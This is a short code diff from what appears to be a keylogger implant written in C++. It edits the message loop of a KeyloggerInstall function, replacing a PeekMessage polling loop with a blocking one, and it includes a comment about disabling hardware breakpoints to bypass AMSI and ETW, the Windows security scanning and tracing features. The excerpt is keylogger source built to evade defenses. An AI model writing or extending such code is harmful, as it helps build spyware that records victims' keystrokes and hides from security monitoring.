@@ -103,7 +103,6 @@ auto DECLFN KeyloggerInstall(
 
     MSG Msg = { 0 };
 
-    /*
     BOOL bRet = 0;
 
     Instance->Win32.PostMessageW(WindowHandle, WM_USER, 0, 0);
@@ -120,28 +119,6 @@ auto DECLFN KeyloggerInstall(
 		SafePipeWrite("[+] Processing message\n", 23);
         Instance->Win32.TranslateMessage(&Msg);
         Instance->Win32.DispatchMessageW(&Msg);
-    }
-
-    */
-
-    while (TRUE)
-    {
-        if (Instance->Win32.PeekMessageW(&Msg, NULL, 0, 0, PM_REMOVE))
-        {
-            if (Msg.message == WM_QUIT)
-            {
-                SafePipeWrite("[+] WM_QUIT received, exiting...\n", 30);
-                break;
-            }
-            Instance->Win32.TranslateMessage(&Msg);
-            Instance->Win32.DispatchMessageW(&Msg);
-        }
-        else
-        {
-			LARGE_INTEGER Interval;
-			Interval.QuadPart = -10 * 1000 * 10; // 10 ms
-			Instance->Win32.NtDelayExecution(FALSE, &Interval);
-        }
     }
 
     // deactive hwbp to bypass amsi/etw
